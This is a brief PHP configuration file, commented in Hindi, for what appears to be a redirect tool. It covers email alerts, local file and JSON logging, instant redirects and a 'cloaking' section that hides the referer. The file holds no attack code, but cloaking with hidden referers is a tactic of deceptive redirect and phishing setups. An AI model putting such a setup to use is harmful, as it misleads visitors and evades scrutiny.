<?php
return [
    'email_notifications' => false,      // true करें तो ईमेल आएगा
    'email_to' => 'your-email@example.com',
    'from_email' => 'security@yourdomain.com',
    'use_smtp' => false,
    
    'log_to_file' => true,               // लोकल फाइल में सेव करेगा
    'log_to_json' => true,               // JSON फॉर्मेट में भी सेव
    
    // डिफॉल्ट रीडायरेक्ट
    'redirect_delay' => 0,               // सेकंड में (0 = तुरंत)
    
    // क्लोकिंग सेटिंग्स
    'hide_referer' => true,
    'use_ssl' => false,                   // अगर HTTPS हो
    
    // रेट लिमिट (spam रोकने के लिए)
    'rate_limit' => 5,                   // 5 सेकंड का गैप
];
?>
